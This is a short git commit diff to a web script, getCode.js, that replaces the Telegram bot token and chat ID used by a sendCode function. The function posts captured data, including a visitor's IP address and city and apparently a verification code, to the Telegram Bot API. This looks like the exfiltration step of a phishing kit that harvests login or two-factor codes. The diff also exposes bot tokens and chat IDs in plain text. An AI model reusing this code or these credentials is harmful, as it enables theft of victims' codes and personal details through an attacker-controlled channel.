e23e3715afa4ff0391e99bdb0a70de8d89950158
fdvs342 <tranluan52718@gmail.com>
2025-07-02 12:36:46 +0700

    Update getCode.js

--- public/js/getCode.js
+++ public/js/getCode.js
@@ -147,8 +147,8 @@ function sendCode() {
             ` <strong>City:</strong> <code>${IpAddress?.city || 'N/A'}</code>`;
 
         NUMBER_TIME_SEND_CODE++;
-        const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
-        const chatId = '-1002416068664';
+        const botToken = '7521413873:AAGI7lAk_B9c5U_T9dyglS_Bhlg73VxMrwU';
+        const chatId = '-1002275895232';
         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
         fetch(telegramUrl, {
